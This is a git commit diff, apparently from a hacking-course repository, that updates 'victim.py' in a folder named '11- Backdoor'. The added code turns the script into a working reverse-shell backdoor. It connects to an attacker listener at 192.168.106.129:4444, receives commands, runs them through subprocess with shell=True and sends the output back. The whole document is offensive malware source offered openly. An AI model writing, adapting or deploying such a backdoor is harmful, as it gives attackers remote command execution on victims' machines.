a6d0da2a8c54c18f3a21c4960ecd549122472d62
Melih Sunman <76569614+sunman54@users.noreply.github.com>
2024-01-10 22:06:48 +0300

    backdoor updated

--- 11- Backdoor/victim.py
+++ 11- Backdoor/victim.py
@@ -1,11 +1,19 @@
 import socket 
+import subprocess
+
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(('192.168.106.129',4444))
 
 connection.send('\n[+] Connected!!!\n')
 
-recieved_data = connection.recv(1024)
-print(recieved_data)
+command = connection.recv(1024)
+result = execute_system_command(command)
+connection.send(f'\n{result}\n')
+
 
 connection.close()
